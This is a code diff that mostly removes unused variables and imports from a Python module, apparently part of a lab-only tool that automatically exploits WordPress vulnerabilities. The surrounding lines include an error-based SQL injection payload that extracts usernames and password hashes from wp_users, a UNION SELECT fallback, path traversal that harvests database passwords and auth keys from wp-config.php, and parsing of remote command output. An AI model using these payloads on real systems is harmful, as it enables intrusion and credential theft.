@@ -11,7 +11,6 @@ SECURITY: Only runs against ephemeral Docker labs created by binoracle.
 """
 
 import re
-import time
 from typing import Optional, Callable
 
 __all__ = ["run_weaponization"]
@@ -99,8 +98,8 @@ def _weaponize_sqli(boot, res, step_fn) -> dict:
 
     # --- Strategy 1: Error-based extraction ---
     error_payload = (
-        f"1' AND extractvalue(1,concat(0x7e,"
-        f"(SELECT concat(user_login,0x3a,user_pass) FROM wp_users LIMIT 1)))-- -"
+        "1' AND extractvalue(1,concat(0x7e,"
+        "(SELECT concat(user_login,0x3a,user_pass) FROM wp_users LIMIT 1)))-- -"
     )
     p1 = dict(base_params)
     p1[param] = error_payload
@@ -127,7 +126,6 @@ def _weaponize_sqli(boot, res, step_fn) -> dict:
     if not found_users:
         _step(step_fn, "error-based extraction empty, trying UNION SELECT dump")
         for col_count in range(2, 9):
-            nulls = ",".join(["NULL"] * col_count)
             # Try user_login in position 1 and user_pass in position 2
             for login_pos in range(1, col_count):
                 for pass_pos in range(1, col_count):
@@ -204,7 +202,6 @@ def _weaponize_lfi(boot, res, step_fn) -> dict:
 
     db_credentials = {}
     auth_keys = ""
-    raw_config = ""
 
     for path_payload in traversal_targets:
         p = {param: path_payload}
@@ -216,7 +213,6 @@ def _weaponize_lfi(boot, res, step_fn) -> dict:
         body = r.text or ""
         # Check if wp-config.php content appeared
         if "DB_NAME" in body or "DB_PASSWORD" in body or "table_prefix" in body:
-            raw_config = body[:3000]
             # Extract credentials
             for key in ("DB_NAME", "DB_USER", "DB_PASSWORD", "DB_HOST", "table_prefix",
                         "AUTH_KEY", "SECURE_AUTH_KEY", "LOGGED_IN_KEY"):
@@ -292,7 +288,6 @@ def _weaponize_rce(boot, res, step_fn) -> dict:
         uid_match = re.search(r'uid=\d+\(([^\)]+)\)', body)
         hostname_match = re.search(r'(?:^|\n)([a-z0-9][-a-z0-9]{0,62})\n', body, re.MULTILINE)
         uname_match = re.search(r'Linux\s+\S+\s+\S+\s+#', body)
-        passwd_match = re.search(r'root:.*?www-data:[^:\n]+', body, re.DOTALL)
         if uid_match or uname_match:
             output_data["user"] = uid_match.group(1) if uid_match else "www-data"
             output_data["hostname"] = hostname_match.group(1) if hostname_match else "unknown"
@@ -348,7 +343,6 @@ def _weaponize_file_upload(boot, res, step_fn) -> dict:
 
 def _weaponize_auth_bypass(boot, res, step_fn) -> dict:
     """Verify admin access via confirmed auth bypass."""
-    ev = res.evidence
     _step(step_fn, "probing admin-only endpoints via auth bypass credentials")
 
     # Try admin REST API with bypass credentials or no auth
